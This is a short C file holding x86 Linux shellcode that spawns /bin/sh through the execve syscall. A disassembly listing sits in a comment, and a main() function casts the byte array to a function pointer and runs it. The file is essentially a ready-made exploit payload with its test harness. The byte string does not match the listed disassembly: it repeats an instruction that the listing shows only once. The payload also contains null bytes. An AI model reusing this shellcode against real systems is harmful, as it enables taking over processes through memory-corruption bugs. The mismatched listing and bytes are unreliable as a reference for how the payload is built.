/*
80483f0:	31 c0                	xor    %eax,%eax
80483f2:	68 2f 73 68 00       	push   $0x68732f
80483f7:	68 2f 62 69 6e       	push   $0x6e69622f
80483fc:	89 c1                	mov    %eax,%ecx
80483fe:	89 c2                	mov    %eax,%edx
8048400:	89 e3                	mov    %esp,%ebx
8048402:	b8 0b 00 00 00       	mov    $0xb,%eax
8048407:	cd 80                	int    $0x80
*/

int main(void){
	const char shellcode[] = "\x31\xc0\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xc1\x89\xc1\x89\xc2\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80";
	(*(void(*)())shellcode)();
}
